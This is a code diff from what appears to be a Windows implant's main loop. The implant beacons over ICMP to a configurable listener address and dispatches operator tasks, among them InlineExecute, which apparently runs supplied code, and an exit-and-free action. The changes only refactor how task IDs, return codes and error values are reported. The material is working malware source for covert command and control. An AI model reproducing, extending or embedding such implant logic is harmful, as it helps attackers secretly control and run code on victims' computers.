@@ -72,12 +72,11 @@ D_SEC( B ) VOID WINAPI Entry( VOID )
 					/* Set return buffer header */
 					Ret = C_PTR( U_PTR( Onb->Buffer ) + sizeof( Ctx->Id ) );
 					Ret->TaskId     = 0;
-					Ret->CallbackId = NoAction;
-					Ret->ReturnCode = 0;
+					Ret->ReturnCode = NoAction;
 					Ret->ErrorValue = 0;
 
 					/* Execute "Hello" */
-					if ( TaskHello( Ctx, NULL, 0, Onb ) ) {
+					if ( TaskHello( Ctx, 0, NULL, 0, Onb ) != ErrorAction ) {
 						/* Change the IP to be configurable */
 						Ctx->Established = IcmpSend( C_PTR( G_PTR( ICMP_LISTENER_ADDRESS ) ), Ctx, Onb->Buffer, Onb->Length );
 					};
@@ -113,14 +112,13 @@ D_SEC( B ) VOID WINAPI Entry( VOID )
 											switch( Req->TaskCode ) {
 												case Hello:
 													/* Execute TaskHello */
-													Res = TaskHello( Ctx, Req->Buffer, Req->Length, Onb );
+													Res = TaskHello( Ctx, Req->TaskId, Req->Buffer, Req->Length, Onb );
 													Ret = C_PTR( U_PTR( Onb->Buffer ) + sizeof( Ctx->Id ) );
 
 													/* Set return info */
 													Ret->TaskId = Req->TaskId;
-													Ret->CallbackId = NoAction;
 													Ret->ReturnCode = Res;
-													Ret->ErrorValue = NtCurrentTeb()->LastErrorValue;
+													Ret->ErrorValue = Res != ErrorAction ? 0 : NtCurrentTeb()->LastErrorValue;
 
 													/* Abort */
 													break;
@@ -131,22 +129,20 @@ D_SEC( B ) VOID WINAPI Entry( VOID )
 
 													/* Set return info */
 													Ret->TaskId     = Req->TaskId;
-													Ret->CallbackId = ExitFreeAction;
-													Ret->ReturnCode = 0;
+													Ret->ReturnCode = ExitFreeAction;
 													Ret->ErrorValue = 0;
 
 													/* Abort */
 													break;
 												case InlineExecute:
 													/* Execute InlineExecute */
-													Res = TaskInlineExecute( Ctx, Req->Buffer, Req->Length, Onb );
+													Res = TaskInlineExecute( Ctx, Req->TaskId, Req->Buffer, Req->Length, Onb );
 													Ret = C_PTR( U_PTR( Onb->Buffer ) + sizeof( Ctx->Id ) );
 
 													/* Set return info */
 													Ret->TaskId     = Req->TaskId;
-													Ret->CallbackId = NoAction;
 													Ret->ReturnCode = Res;
-													Ret->ErrorValue = NtCurrentTeb()->LastErrorValue;
+													Ret->ErrorValue = Res != ErrorAction ? 0 : NtCurrentTeb()->LastErrorValue;
 
 													/* Abort */
 													break;
